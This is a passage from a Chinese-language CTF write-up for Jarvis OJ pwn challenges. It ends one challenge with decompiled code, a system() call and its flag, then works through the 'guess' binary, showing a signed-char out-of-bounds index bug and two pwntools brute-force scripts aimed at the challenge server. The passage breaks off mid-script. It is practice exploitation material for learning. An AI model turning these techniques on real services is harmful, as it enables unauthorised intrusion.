62u];</span><br><span class="line">  printf(&quot;%s&quot;, rand_str_10);</span><br><span class="line">  mem_test(rand_str_10);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int __cdecl mem_test(char *rnd_str_10)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax@2</span><br><span class="line">  char input; // [sp+15h] [bp-13h]@1</span><br><span class="line"></span><br><span class="line">  memset(&amp;input, 0, 11u);</span><br><span class="line">  puts(&quot;\nwhat???? : &quot;);</span><br><span class="line">  printf(&quot;0x%x \n&quot;, hint);</span><br><span class="line">  puts(&quot;cff flag go go go ...\n&quot;);</span><br><span class="line">  printf(&quot;&gt; &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%s&quot;, &amp;input);</span><br><span class="line">  if ( !strncmp(&amp;input, rnd_str_10, 4u) )</span><br><span class="line">    result = puts(&quot;good job!!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    result = puts(&quot;cff flag is failed!!\n&quot;);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int __cdecl win_func(char *command)</span><br><span class="line">&#123;</span><br><span class="line">  return system(command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:0804A040 hint            dd offset aCatFlag      ; DATA XREF: mem_test+2Dr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.rodata:080487E0 aCatFlag        db &apos;cat flag&apos;,0         ; DATA XREF: .data:hinto</span><br></pre></td></tr></table></figure>
<p>不用管那个校验码，因为无论对错最后都是return，又不是说错了就会exit。</p>
<p>还有就是要注意那个strncmp的地方，一定要用合法的指针覆盖它，不然程序会GG。</p>
<p>flag：<code>CTF{332e294fb7aeeaf0e1c7703a29304343}</code></p>
<hr>
<h2 id="PWN-guess"><a href="#PWN-guess" class="headerlink" title="PWN - guess"></a>PWN - guess</h2><p>题目描述：</p>
<blockquote>
<p>你猜，你猜，你猜不到，你猜对了就给你flag</p>
</blockquote>
<blockquote>
<p>nc pwn.jarvisoj.com 9878</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/guess.0eff3b4fdf70b3d7c2108758691c9be3" target="_blank" rel="noopener">guess.0eff3b4fdf70b3d7c2108758691c9be3</a></p>
</blockquote>
<p>这道题和之前那那几道相比可以说是独树一帜。因为他没有栈溢出，不需要ROP，也没有堆溢出。</p>
<p>首先看一下程序代码：</p>
<p>main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  sockaddr_in bind_addr; // [sp+0h] [bp-20h]@4</span><br><span class="line">  pid_t child_pid; // [sp+14h] [bp-Ch]@12</span><br><span class="line">  int s_; // [sp+18h] [bp-8h]@10</span><br><span class="line">  int s; // [sp+1Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  s = socket(2, 1, 0);</span><br><span class="line">  if ( s == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;unable to create server socket&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;bind_addr.sin_family = 0LL;</span><br><span class="line">  *(_QWORD *)&amp;bind_addr.sin_zero[0] = 0LL;</span><br><span class="line">  bind_addr.sin_family = 2;</span><br><span class="line">  bind_addr.sin_port = htons(9999u);</span><br><span class="line">  if ( bind(s, (const struct sockaddr *)&amp;bind_addr, 0x10u) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;unable to bind socket&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( listen(s, 16) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;deaf&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      s_ = accept(s, 0LL, 0LL);</span><br><span class="line">      if ( s_ != -1 )</span><br><span class="line">        break;</span><br><span class="line">      perror(&quot;accept failed, is this bad?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    child_pid = fork();</span><br><span class="line">    if ( child_pid == -1 )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(&quot;can&apos;t fork! that&apos;s bad, I think.&quot;);</span><br><span class="line">      close(s_);</span><br><span class="line">      sleep(1u);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !child_pid )</span><br><span class="line">      &#123;</span><br><span class="line">        close(s);</span><br><span class="line">        handle(s_);                             // 进入主要处理函数</span><br><span class="line">        exit(0);</span><br><span class="line">      &#125;</span><br><span class="line">      close(s_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数没什么好看的，就是这题不能直接运行做，他会开出9999端口，然后<code>nc 127.0.0.1 9999</code>开始做题，<code>handle(s_);</code>这里进去才是关键函数的开始。</p>
<p>handle函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall handle(int s)</span><br><span class="line">&#123;</span><br><span class="line">  char inbuf[4096]; // [sp+10h] [bp-1010h]@5</span><br><span class="line">  int correct; // [sp+101Ch] [bp-4h]@6</span><br><span class="line"></span><br><span class="line">  alarm(0x78u);</span><br><span class="line">  if ( dup2(s, 0) == -1 || dup2(s, 1) == -1 )</span><br><span class="line">    exit(1);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(&quot;Notice: Important!!\nThis is a test program for you to test on localhost.\nNotice flag in this test program starts with `FAKE&#123;` and the\nprogram on server has the real flag which starts with `PCTF&#123;`\n\n\n\nWelcome to the super-secret flag guess validation system!\nUnfortunately, it only works for the flag for this challenge though.\nThe correct flag is 50 characters long, begins with `PCTF&#123;` and\nends with `&#125;` (without the quotes). All characters in the flag\nare lowercase hex (so they are in [0-9a-f]).\n\nBefore you can submit your flag guess, you have to encode the\nwhole guess with hex again (including the `PCTF&#123;` and the `&#125;`).\nThis protects the flag from corruption through network nodes that\ncan&apos;t handle non-hex traffic properly, just like in email.\n&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;guess&gt; &quot;);</span><br><span class="line">    if ( !fgets(inbuf, 4096, stdin) )</span><br><span class="line">      break;</span><br><span class="line">    rtrim(inbuf);</span><br><span class="line">    correct = is_flag_correct(inbuf);//进入判断函数</span><br><span class="line">    if ( correct )</span><br><span class="line">      puts(&quot;Yaaaay! You guessed the flag correctly! But do you still remember what you entered? If not, feel free to try again!&quot;);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;Nope.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读入字符串，然后丢到判断函数中，如果判断正确就输出正确的提示，如果错误就输出错误的提示，<code>while(1)</code>可以循环判断。</p>
<p>is_flag_correct函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall is_flag_correct(char *flag_hex)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // eax@2</span><br><span class="line">  char given_flag[50]; // [sp+10h] [bp-190h]@4</span><br><span class="line">  char flag[50]; // [sp+50h] [bp-150h]@4</span><br><span class="line">  char bin_by_hex[256]; // [sp+90h] [bp-110h]@4</span><br><span class="line">  char value2; // [sp+192h] [bp-Eh]@5</span><br><span class="line">  char value1; // [sp+193h] [bp-Dh]@5</span><br><span class="line">  int i_0; // [sp+194h] [bp-Ch]@11</span><br><span class="line">  char diff; // [sp+19Bh] [bp-5h]@11</span><br><span class="line">  int i; // [sp+19Ch] [bp-4h]@4</span><br><span class="line"></span><br><span class="line">  if ( strlen(flag_hex) != 100 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = strlen(flag_hex);</span><br><span class="line">    printf(&quot;bad input, that hexstring should be 100 chars, but was %d chars long!\n&quot;, v1);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  qmemcpy(bin_by_hex, &amp;byte_401100, sizeof(bin_by_hex));</span><br><span class="line">  *(_DWORD *)flag = &apos;EKAF&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[4] = &apos;3b9&#123;&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[8] = &apos;3e55&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[12] = &apos;2d49&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[16] = &apos;e070&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[20] = &apos;d0db&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[24] = &apos;591f&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[28] = &apos;2b8d&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[32] = &apos;0543&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[36] = &apos;2cc9&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[40] = &apos;2729&apos;;</span><br><span class="line">  *(_DWORD *)&amp;flag[44] = &apos;14cb&apos;;</span><br><span class="line">  *(_WORD *)&amp;flag[48] = &apos;&#125;2&apos;;</span><br><span class="line">  bzero(given_flag, 50uLL);</span><br><span class="line">  for ( i = 0; i &lt;= 49; ++i )                   // 限制50字节循环</span><br><span class="line">  &#123;</span><br><span class="line">    value1 = bin_by_hex[flag_hex[2 * i]];</span><br><span class="line">    value2 = bin_by_hex[flag_hex[2 * i + 1]];</span><br><span class="line">    if ( value1 == -1 || value2 == -1 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;bad input 鈥one of the characters you supplied was not a valid hex character!&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    given_flag[i] = value2 | 16 * value1;</span><br><span class="line">  &#125;</span><br><span class="line">  diff = 0;</span><br><span class="line">  for ( i_0 = 0; i_0 &lt;= 49; ++i_0 )             // 限制50字节比较</span><br><span class="line">    diff |= flag[i_0] ^ given_flag[i_0];</span><br><span class="line">  return diff == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>乍一看没有什么栈溢出的地方，仔细一看的确没有栈溢出，但是有下标溢出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">value1 = bin_by_hex[flag_hex[2 * i]];</span><br><span class="line">value2 = bin_by_hex[flag_hex[2 * i + 1]];</span><br></pre></td></tr></table></figure>
<p>这两句很关键，仔细观察可以发现，<code>flag_hex</code>的类型为<code>char *flag_hex</code>，也就是有符号的，而<code>bin_by_hex</code>这个数组有通过<code>flag_hex[2 * i]</code>的值来读取，所以我们可以构造负数来读取在<code>bin_by_hex</code>上面的内容。我们来看一下栈的布局。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">-00000000000001A0 ; D/A/*   : change type (data/ascii/array)</span><br><span class="line">-00000000000001A0 ; N       : rename</span><br><span class="line">-00000000000001A0 ; U       : undefine</span><br><span class="line">-00000000000001A0 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-00000000000001A0 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-00000000000001A0 ; Frame size: 1A0; Saved regs: 8; Purge: 0</span><br><span class="line">-00000000000001A0 ;</span><br><span class="line">-00000000000001A0</span><br><span class="line">-00000000000001A0                 db ? ; undefined</span><br><span class="line">-000000000000019F                 db ? ; undefined</span><br><span class="line">-000000000000019E                 db ? ; undefined</span><br><span class="line">-000000000000019D                 db ? ; undefined</span><br><span class="line">-000000000000019C                 db ? ; undefined</span><br><span class="line">-000000000000019B                 db ? ; undefined</span><br><span class="line">-000000000000019A                 db ? ; undefined</span><br><span class="line">-0000000000000199                 db ? ; undefined</span><br><span class="line">-0000000000000198 flag_hex        dq ?                    ; offset</span><br><span class="line">-0000000000000190 given_flag      db 50 dup(?)</span><br><span class="line">-000000000000015E                 db ? ; undefined</span><br><span class="line">-000000000000015D                 db ? ; undefined</span><br><span class="line">-000000000000015C                 db ? ; undefined</span><br><span class="line">-000000000000015B                 db ? ; undefined</span><br><span class="line">-000000000000015A                 db ? ; undefined</span><br><span class="line">-0000000000000159                 db ? ; undefined</span><br><span class="line">-0000000000000158                 db ? ; undefined</span><br><span class="line">-0000000000000157                 db ? ; undefined</span><br><span class="line">-0000000000000156                 db ? ; undefined</span><br><span class="line">-0000000000000155                 db ? ; undefined</span><br><span class="line">-0000000000000154                 db ? ; undefined</span><br><span class="line">-0000000000000153                 db ? ; undefined</span><br><span class="line">-0000000000000152                 db ? ; undefined</span><br><span class="line">-0000000000000151                 db ? ; undefined</span><br><span class="line">-0000000000000150 flag            db 50 dup(?)</span><br><span class="line">-000000000000011E                 db ? ; undefined</span><br><span class="line">-000000000000011D                 db ? ; undefined</span><br><span class="line">-000000000000011C                 db ? ; undefined</span><br><span class="line">-000000000000011B                 db ? ; undefined</span><br><span class="line">-000000000000011A                 db ? ; undefined</span><br><span class="line">-0000000000000119                 db ? ; undefined</span><br><span class="line">-0000000000000118                 db ? ; undefined</span><br><span class="line">-0000000000000117                 db ? ; undefined</span><br><span class="line">-0000000000000116                 db ? ; undefined</span><br><span class="line">-0000000000000115                 db ? ; undefined</span><br><span class="line">-0000000000000114                 db ? ; undefined</span><br><span class="line">-0000000000000113                 db ? ; undefined</span><br><span class="line">-0000000000000112                 db ? ; undefined</span><br><span class="line">-0000000000000111                 db ? ; undefined</span><br><span class="line">-0000000000000110 bin_by_hex      db 256 dup(?)</span><br><span class="line">-0000000000000010                 db ? ; undefined</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E value2          db ?</span><br><span class="line">-000000000000000D value1          db ?</span><br><span class="line">-000000000000000C i_0             dd ?</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005 diff            db ?</span><br><span class="line">-0000000000000004 i               dd ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>喜闻乐见的发现，<code>flag</code>在<code>bin_by_hex</code>的上面，而且距离不超过128，因此我们可以通过构造使value1为0，value2为flag[i]。比如我们要覆盖第i位，我们构造<code>flag_hex</code>第<code>2i</code>和<code>2i+1</code>位为<code>&#39;0&#39;</code>和<code>chr(0x40 + 128 + i)</code>，0x40是<code>bin_by_hex</code>和<code>flag</code>之间的offset，128是把它转换成负数，i代表第i位。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt;= 49; ++i )                   // 限制50字节循环</span><br><span class="line">  &#123;</span><br><span class="line">    value1 = bin_by_hex[flag_hex[2 * i]];</span><br><span class="line">    value2 = bin_by_hex[flag_hex[2 * i + 1]];</span><br><span class="line">    if ( value1 == -1 || value2 == -1 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;bad input 鈥one of the characters you supplied was not a valid hex character!&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    given_flag[i] = value2 | 16 * value1;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>我们先构造一份完全造假的flag发过去：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    raw_pay += <span class="string">'0'</span></span><br><span class="line">    raw_pay += chr(<span class="number">0x40</span>+<span class="number">128</span>+i)</span><br><span class="line">cn.sendline(raw_pay)</span><br></pre></td></tr></table></figure>
<p>发现回显提示我们正确：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yaaaay! You guessed the flag correctly! But do you still remember what you entered? If not, feel free to try again!</span><br></pre></td></tr></table></figure>
<p>但气的是他并没有把flag打印出来，我们没法交差啊！</p>
<p>是时候爆破了。</p>
<p>之前爆破必须强行爆破出50才知道对错，现在我们可以一位一位爆破了，因为其他位都被我们伪造了，相当于执行了<code>given_flag[i] = flag[i]</code>，我们只修改一位为我们需要的爆破位，直到出现correct的提示，就说明我们爆破成功了。</p>
<p>剩下就是poc了：</p>
<p>单线程版：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> b.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">rr=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rr:</span><br><span class="line">    cn = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9878</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'./guess'</span>)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">raw_pay=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    raw_pay += <span class="string">'0'</span></span><br><span class="line">    raw_pay += chr(<span class="number">0x40</span>+<span class="number">128</span>+i)</span><br><span class="line"></span><br><span class="line">out=<span class="string">'5043'</span><span class="comment">#已经爆破的进度，没有多线程网络环境不好的时候可能爆破不完</span></span><br><span class="line">raw_pay = out + raw_pay[len(out):]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(out)/<span class="number">2</span>,<span class="number">50</span>): </span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> chr(ch).isalnum() <span class="keyword">or</span> chr(ch) == <span class="string">'&#123;'</span> <span class="keyword">or</span> chr(ch) == <span class="string">'&#125;'</span>:</span><br><span class="line">            pay = list(raw_pay)</span><br><span class="line">            pay[<span class="number">2</span>*i] = chr(ch).encode(<span class="string">'hex'</span>)[<span class="number">0</span>]</span><br><span class="line">            pay[<span class="number">2</span>*i+<span class="number">1</span>] = chr(ch).encode(<span class="string">'hex'</span>)[<span class="number">1</span>]</span><br><span class="line">            pay = <span class="string">''</span>.join(pay)</span><br><span class="line">            cn.sendline(pay)</span><br><span class="line">            ret = cn.recvline()</span><br><span class="line">            cn.recv()</span><br><span class="line">            <span class="keyword">if</span> ret != <span class="string">'Nope.\n'</span>:</span><br><span class="line">                raw_pay = pay</span><br><span class="line">                <span class="keyword">print</span> pay</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"find flag: "</span> + pay.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<p>多线程版：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> b.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">'*'</span>]*<span class="number">50</span></span><br><span class="line">bin = ELF(<span class="string">'./guess'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(leak)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line"></span><br><span class="line">    rr=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> rr:</span><br><span class="line">        cn = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9878</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cn.recv()</span><br><span class="line"></span><br><span class="line">    raw_pay=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        raw_pay += <span class="string">'0'</span></span><br><span class="line">        raw_pay += chr(<span class="number">0x40</span>+<span class="number">128</span>+i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> chr(ch).isalnum() <span class="keyword">or</span> chr(ch) == <span class="string">'&#123;'</span> <span class="keyword">or</span> chr(ch) == <span class="string">'&#125;'</span>:</span><br><span class="line">            pay = list(raw_pay)</span><br><span class="line">            pay[<span class="number">2</span>*leak] = chr(ch).encode(<span class="string">'hex'</span>)[<span class="number">0</span>]</span><br><span class="line">            pay[<span class="number">2</span>*leak+<span class="number">1</span>] = chr(ch).encode(<span class="string">'hex'</span>)[<span class="number">1</span>]</span><br><span class="line">            pay = <span class="string">''</span>.join(pay)</span><br><span class="line">            cn.sendline(pay)</span><br><span class="line">            ret = cn.recvline()</span><br><span class="line">            cn.recv()</span><br><span class="line">            <span class="keyword">if</span> ret != <span class="string">'Nope.\n'</span>:</span><br><span class="line">                flag[leak] = chr(ch)</span><br><span class="line">                <span class="keyword">print</span> chr(ch),</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    cn.close()</span><br><span class="line"></span><br><span class="line">t=[<span class="number">0</span>]*<span class="number">50</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):<span class="comment">#使用多线程，每一个线程只爆破一位</span></span><br><span class="line">    t[i] = threading.Thread(target=pwn,args=(i,))</span><br><span class="line">    t[i].start()</span><br><span 